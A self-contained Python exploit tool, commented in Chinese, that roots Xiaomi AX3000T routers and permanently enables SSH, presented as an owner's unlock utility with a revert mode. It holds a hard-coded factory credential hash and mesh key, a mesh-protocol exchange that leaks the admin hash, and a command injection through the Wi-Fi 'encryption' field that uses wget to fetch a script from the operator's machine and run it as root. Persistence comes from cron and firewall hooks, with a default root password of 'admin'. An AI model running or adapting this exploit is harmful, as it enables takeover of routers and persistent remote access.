#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
小米 AX3000T 高通版 (RD03v2) 原厂固件 SSH 解锁与恢复工具箱
- 100% 采用 Python 原生标准库，无需 pip 安装任何第三方模块
- 单文件自包含漏洞利用与握手，无需 git clone 任何仓库
- 支持功能：
    [1] 开启 SSH 并永久固化 (支持自定义 root 密码，自动双模自愈，适配主路由与中继模式)
    [2] 撤销 Root 权限并完全关闭 SSH (清理固化与自启，无痕恢复出厂)
"""

import sys
import os
import time
import socket
import ssl
import json
import base64
import hashlib
import hmac
import random
import struct
import re
import threading
import http.server
import urllib.request
import urllib.parse
import urllib.error

# 官方固件常量与出厂凭据
FACTORY_ADMIN_HASH = "73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24"
MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
MESH_PORT = 19553
MESH_VER = 0x1001
MESH_HDR = 0x2C

def get_local_ip(target="192.168.31.1"):
    """探测本机与路由器通信的网卡 IP（纯标准库，跨平台免调用系统命令）"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "192.168.31.100"
    finally:
        s.close()
    return ip

def port_open(host, port, timeout=2.5):
    """检测 TCP 端口是否畅通"""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False

# ---- HTTP 请求封装 ----
def http_json(url, data=None, timeout=25, retries=3):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("Connection", "close")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    
    last_err = None
    for _ in range(retries):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode("utf-8", "replace"))
        except Exception as e:
            last_err = e
            time.sleep(2)
    raise RuntimeError(f"请求失败: {url} -> {last_err}")

# ---- 阶段 1：出厂初始化并重启开放 Mesh 端口 ----
def init_factory_cap(host):
    print("\n[+] 步骤 1/4: 检测路由器出厂状态并初始化环境...")
    info = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/init_info")
    print(f"[*] 设备型号: {info.get('hardware')}  固件版本: {info.get('romversion')}  初始标记: {info.get('inited')}")

    if port_open(host, MESH_PORT):
        print("[!] 检测到 Mesh 端口 19553 已就绪，无需重复初始化。")
        return

    # 构造未初始化状态下的认证 Nonce
    mac = "00:00:00:00:00:00"
    nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 9999)}"
    pwd = hashlib.sha256((nonce + FACTORY_ADMIN_HASH).encode()).hexdigest()
    
    res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
        "username": "admin", "password": pwd, "nonce": nonce
    })
    stok = res.get("token")
    if not stok:
        raise RuntimeError(f"出厂登录被拒绝: {res}。请确保路由器已长按 Reset 恢复出厂，且未走完设置向导！")

    ssid = info.get("routername") or "Xiaomi_AX3000T"
    print(f"[*] 提交免配置初始化 (SSID: {ssid})...")
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/router_init", {
        "wifi24Ssid": ssid, "wifi50Ssid": ssid
    })

    print("[*] 正在通知路由器重启，启动底层 Mesh 监听服务...")
    try:
        http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/reboot", {}, timeout=5)
    except Exception:
        pass

    print("[*] 等待路由器重启并上线 (约需 80~100 秒)，请勿断电或拔网线...")
    time.sleep(30)
    for _ in range(35):
        if port_open(host, MESH_PORT):
            print(f"\n[+] 路由器已重启就绪，Mesh 认证端口 {MESH_PORT} 开放成功！")
            return
        print(".", end="", flush=True)
        time.sleep(3)
    raise RuntimeError("等待超时：路由器 19553 端口未能正常打开。")

# ---- 阶段 2：Mesh 漏洞利用与协议层实现 ----
def _hdr(typ, blen):
    h = bytearray(MESH_HDR)
    h[0:2] = struct.pack(">H", MESH_VER)
    h[2:4] = struct.pack(">H", blen)
    h[4:6] = struct.pack(">H", typ)
    return bytes(h)

def _q_pass(ident: bytes) -> bytes:
    return base64.b64encode(
        hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest()
    )

def _tls_connect(host, port=MESH_PORT, timeout=20.0, retries=4):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    for i in range(retries):
        try:
            return ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
            if i == retries - 1:
                raise RuntimeError(f"TLS 连接 {host}:{port} 失败: {e}")
            print(f"    (TLS 连接槽忙，等待 5 秒后重试 {i+1}/{retries}...)")
            time.sleep(5)

def _send_auth(sock, ident: bytes):
    b = bytearray(0xA4)
    b[0:len(ident)] = ident
    p = _q_pass(ident)
    b[0x10:0x10 + len(p)] = p
    sock.sendall(_hdr(4, len(b)) + bytes(b))

def _send_running(sock):
    b = bytearray(0x20)
    b[0] = 1
    sock.sendall(_hdr(5, len(b)) + bytes(b))

def leak_admin_stok(host, ident=b"ota0001", timeout=20.0):
    s = _tls_connect(host, timeout=timeout)
    _send_auth(s, ident)
    time.sleep(1.0)
    _send_running(s)

    buf = b""
    cfg = None
    s.settimeout(1.0)
    deadline = time.time() + 10.0
    while time.time() < deadline and cfg is None:
        try:
            chunk = s.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= MESH_HDR:
            _, blen, typ = struct.unpack(">HHH", buf[0:6])
            if len(buf) < MESH_HDR + blen:
                break
            body = buf[MESH_HDR:MESH_HDR + blen]
            buf = buf[MESH_HDR + blen:]
            if typ == 6:
                js, je = body.find(b"{"), body.rfind(b"}")
                if js != -1 and je > js:
                    try:
                        cfg = json.loads(body[js:je + 1].decode("utf-8", "replace"))
                    except Exception:
                        pass
    try:
        s.close()
    except OSError:
        pass

    if cfg is None:
        raise RuntimeError("未在超时时间内收到路由器返回的 Type-6 配置同步包。")
    h256 = cfg.get("web_passwd256", "")
    if not h256:
        h256 = FACTORY_ADMIN_HASH
    print(f"[+] 成功提取原厂管理凭据: {h256[:16]}...")

    nonce = f"0_00:00:00:00:00:00_{int(time.time())}_{random.randint(1000, 9999)}"
    pwd = hashlib.sha256((nonce + h256).encode()).hexdigest()
    res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
        "username": "admin", "password": pwd, "nonce": nonce
    })
    stok = res.get("token")
    if not stok:
        raise RuntimeError(f"换取管理 token 失败: {res}")
    return stok

# ---- 远程通用自愈与全能固化 Shell 构造 ----
def build_remote_sh(root_password):
    safe_pwd = root_password.replace("'", "'\\''")
    return f"""#!/bin/sh

# 1. 采用三重方式确保 root 密码设置成功
echo -e '{safe_pwd}\\n{safe_pwd}' | passwd root 2>/dev/null
(echo '{safe_pwd}'; sleep 1; echo '{safe_pwd}') | passwd root 2>/dev/null
echo 'root:{safe_pwd}' | chpasswd 2>/dev/null

# 2. 写入 NVRAM 和 BDATA 环境变量
nvram set ssh_en=1
nvram set telnet_en=1
nvram set uart_en=1
nvram set boot_wait=on
nvram commit
bdata set ssh_en=1 2>/dev/null
bdata commit 2>/dev/null

# 3. 创建持久化守护脚本 (/data 分区在重启、重配网络或升级时 100% 保留)
mkdir -p /data/auto_ssh
cat << 'EOF' > /data/auto_ssh/auto_ssh.sh
#!/bin/sh
# 确保 NVRAM 标记
[ "$(nvram get ssh_en)" = 0 ] && nvram set ssh_en=1 && nvram commit

# 确保 root 密码不被系统初始化冲掉
echo -e '{safe_pwd}\\n{safe_pwd}' | passwd root 2>/dev/null

# 关键：修补官方 dropbear 启动脚本，解除 release 稳定版对 SSH 的硬编码限制
if [ -f /etc/init.d/dropbear ]; then
    sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
fi

# 确保 dropbear 自启并运行
if [ -z "$(pidof dropbear)" ]; then
    /etc/init.d/dropbear enable
    /etc/init.d/dropbear restart 2>/dev/null
fi

# 全自动自愈：无论是主路由还是切换到中继 AP，只要防火墙规则被官方重置，立即自动重挂
if ! uci -q get firewall.auto_ssh >/dev/null; then
    uci set firewall.auto_ssh=include
    uci set firewall.auto_ssh.type='script'
    uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
    uci set firewall.auto_ssh.enabled='1'
    uci commit firewall 2>/dev/null
fi
EOF
chmod +x /data/auto_ssh/auto_ssh.sh

# 4. 挂载到系统防火墙自启模块
uci set firewall.auto_ssh=include
uci set firewall.auto_ssh.type='script'
uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
uci set firewall.auto_ssh.enabled='1'
uci commit firewall

# 5. 保底计划任务 (每 2 分钟巡视一次服务状态，防范中继模式刚切换完的几分钟窗口)
(crontab -l 2>/dev/null | grep -v "auto_ssh"; echo "*/2 * * * * /data/auto_ssh/auto_ssh.sh") | crontab - 2>/dev/null

# 6. 解锁当前环境下的 dropbear 脚本并立即拉起服务
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart 2>/dev/null

# 7. WiFi 异步自愈守护 (与原作者经过硬件实测验证的标准完全一致，保持 AP 稳定且可用)
(
  i=0
  while [ $i -lt 30 ]; do
    i=$((i+1)); sleep 5
    changed=0
    for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
      e=$(uci -q get wireless.$s.encryption 2>/dev/null)
      case "$e" in
        *wget*|*"sh /tmp"*)
          uci -q set wireless.$s.encryption='psk2'
          uci -q set wireless.$s.key='meshpoc12345'
          changed=1 ;;
      esac
    done
    [ "$changed" = 1 ] && {{ uci -q commit wireless; wifi reload 2>/dev/null; }}
  done
) &
"""

# ---- 远程完全撤销与还原 Shell 构造 ----
def build_revert_sh():
    return """#!/bin/sh

# 1. 立即停止 Dropbear (SSH) 与 Telnet 服务并禁用开机自启
/etc/init.d/dropbear stop 2>/dev/null
/etc/init.d/dropbear disable 2>/dev/null
/etc/init.d/telnet stop 2>/dev/null
/etc/init.d/telnet disable 2>/dev/null
killall -9 dropbear telnetd 2>/dev/null

# 2. 还原 NVRAM 和 BDATA 环境变量为出厂关闭状态
nvram set ssh_en=0
nvram set telnet_en=0
nvram set uart_en=0
nvram set boot_wait=off
nvram commit
bdata set ssh_en=0 2>/dev/null
bdata commit 2>/dev/null

# 3. 彻底删除 /data 下的持久化脚本
rm -rf /data/auto_ssh

# 4. 从防火墙配置中删除开机自启
uci -q delete firewall.auto_ssh
uci commit firewall 2>/dev/null
/etc/init.d/firewall reload 2>/dev/null

# 5. 清理 crontab 定时任务
(crontab -l 2>/dev/null | grep -v "auto_ssh") | crontab - 2>/dev/null

# 6. 还原 dropbear 脚本
[ -f /etc/init.d/dropbear ] && sed -i 's/channel="debug"/channel="release"/g' /etc/init.d/dropbear

# 7. 锁定 root 用户密码（恢复出厂禁用直接登录状态）
passwd -l root 2>/dev/null
"""

class StagerServer(http.server.BaseHTTPRequestHandler):
    payload = b""
    triggered = False
    def do_GET(self):
        StagerServer.triggered = True
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(StagerServer.payload)
    def log_message(self, format, *args):
        pass

def trigger_rce(host, ident=b"ota0001", timeout=20.0, settle=4.0):
    s = _tls_connect(host, timeout=timeout)
    _send_auth(s, ident)
    time.sleep(1.0)
    _send_running(s)
    time.sleep(1.5)
    s.settimeout(2.0)
    try:
        s.recv(4096)
    except Exception:
        pass
    b = bytearray(0x110)
    b[0] = 1
    s.sendall(_hdr(7, len(b)) + bytes(b))
    time.sleep(settle)
    try:
        s.close()
    except OSError:
        pass

def execute_remote_payload(host, local_ip, payload_content):
    port = 8123
    StagerServer.triggered = False
    StagerServer.payload = payload_content.encode("utf-8")
    httpd = http.server.HTTPServer(("0.0.0.0", port), StagerServer)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"[+] 步骤 2/4: 本地临时载荷服务已启动在端口 {port}...")

    print("\n[+] 步骤 3/4: 提取管理凭据并触发漏洞注入...")
    stok = leak_admin_stok(host)

    ssid24, ssid5 = "MiWiFi", "MiWiFi"
    try:
        w_info = http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/wifi_detail_all")
        b_list = w_info.get("info", [])
        if len(b_list) > 0 and b_list[0].get("ssid"):
            ssid24 = b_list[0]["ssid"]
        if len(b_list) > 1 and b_list[1].get("ssid"):
            ssid5 = b_list[1]["ssid"]
        else:
            ssid5 = ssid24
    except Exception:
        pass
    
    p_fetch = f'\\" wget http://{local_ip}:{port}/s -O /tmp/x #'
    p_exec = '\\" sh /tmp/x #'
    
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "1", "ssid": ssid24, "pwd": "meshpoc12345", "encryption": p_fetch
    })
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "2", "ssid": ssid5, "pwd": "meshpoc12345", "encryption": p_exec
    })
    print("[+] 注入指令已写入，发送 Type-7 信号触发底层 root 权限执行...")

    trigger_rce(host)

    print("[*] 正在等待路由器请求并执行操作脚本...")
    for _ in range(15):
        if StagerServer.triggered:
            break
        time.sleep(1)

def do_unlock(host, local_ip):
    print("\n【设置 Root 密码】")
    root_pwd = input("请输入您想为路由器设置的 root 密码 [直接回车默认: admin]: ").strip()
    if not root_pwd:
        root_pwd = "admin"
    print(f"[*] 已设置 root 密码为: {root_pwd}")

    # 步骤 1: 准备出厂环境
    init_factory_cap(host)

    # 步骤 2 & 3: 注入全能双模自愈固化脚本
    execute_remote_payload(host, local_ip, build_remote_sh(root_pwd))

    # 步骤 4: 验证 SSH 状态
    print("\n[+] 步骤 4/4: 检查 SSH 服务状态...")
    time.sleep(4)
    if port_open(host, 22):
        print("\n" + "=" * 68)
        print("  🎉 恭喜！SSH 已经成功开启并完成永久固化！")
        print(f"  ★ SSH 登录账号: root")
        print(f"  ★ SSH 登录密码: {root_pwd}")
        print(f"  ★ 命令行连接:   ssh root@{host}")
        print("=" * 68)
        print("\n[+] 密码概念说明与后续操作：")
        print(f"    1. 【SSH 终端密码】：为您刚才设置的 `{root_pwd}`，用于 SSH 命令行登录。")
        print("    2. 【网页管理密码】：是小米路由器网页后台独立使用的密码，出厂默认是 `admin`；")
        print("       您随后可在网页后台设置向导中，自由将其修改为您想要的管理员密码。")
        print(f"    3. 【验证】：请在当前 PowerShell 窗口直接执行 `ssh root@{host}` 体验 Root 权限！")
    else:
        print(f"[!] 端口 22 尚未响应，请等待数秒后在终端执行: ssh root@{host}")

def do_revert(host, local_ip):
    print("\n" + "=" * 68)
    print("           【撤销 Root 权限与关闭 SSH 服务向导】")
    print("=" * 68)
    print("本操作将对路由器执行以下清理（完全无痕还原出厂状态）：")
    print("  1. 彻底停止 dropbear (SSH) 及 telnetd 进程，关闭 22 端口。")
    print("  2. 将 NVRAM 与 BDATA 中的 ssh_en/telnet_en/uart_en 标志恢复为 0。")
    print("  3. 完全删除 /data/auto_ssh 持久化目录与脚本。")
    print("  4. 从系统防火墙中移除自启脚本挂载，并清理计划任务。")
    print("  5. 锁定 root 用户密码，恢复为原厂禁用直接登录状态。")
    print("=" * 68)

    confirm = input("\n请确认是否要彻底撤销 Root 并关闭 SSH？[输入 YES 确认，按其他键取消]: ").strip()
    if confirm != "YES":
        print("[*] 操作已取消。")
        return

    if port_open(host, MESH_PORT):
        print("\n[*] 检测到 Mesh 端口开放，正在通过底层通道下发撤销与清理载荷...")
        execute_remote_payload(host, local_ip, build_revert_sh())
    else:
        print("\n[*] 正在唤醒底层管理通道以执行无痕清理...")
        init_factory_cap(host)
        execute_remote_payload(host, local_ip, build_revert_sh())

    time.sleep(3)
    print("\n[+] 正在验证清理结果...")
    if not port_open(host, 22):
        print("=" * 68)
        print("  ✔ 撤销成功！SSH 端口 (22) 已成功关闭！")
        print("  ✔ 所有 NVRAM 标记、自启脚本、定时任务均已彻底清除。")
        print("  ✔ root 用户已被锁定，路由器已完全恢复为出厂纯净状态！")
        print("=" * 68)
    else:
        print("[!] 提示：端口 22 仍在响应，可能正在关闭中，建议断电重启路由器以完成最终生效。")

def main():
    print("=" * 68)
    print("      小米 AX3000T 高通版 (RD03v2) 原厂固件 SSH 管理工具箱")
    print("         (纯 Python 原生标准库实现 · 免装模块 · 免克隆代码)")
    print("=" * 68)

    host = "192.168.31.1"
    local_ip = get_local_ip(host)
    print(f"[*] 识别到 Win11 网卡 IP: {local_ip}")
    print(f"[*] 目标路由器默认 IP: {host}")

    print("\n请选择您要执行的操作：")
    print("  [1] 开启 SSH 并永久固化 (获取 Root 权限，自动双模适配常驻)")
    print("  [2] 撤销 Root 权限并彻底关闭 SSH (清理固化与自启，无痕恢复出厂)")
    action = input("\n请输入数字 [1 或 2，回车默认 1]: ").strip()
    if not action:
        action = "1"

    if action == "1":
        do_unlock(host, local_ip)
    elif action == "2":
        do_revert(host, local_ip)
    else:
        print(f"[-] 未知选项: {action}")

    print("\n操作完毕，按任意键或关闭窗口退出。")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[-] 运行出错: {e}")
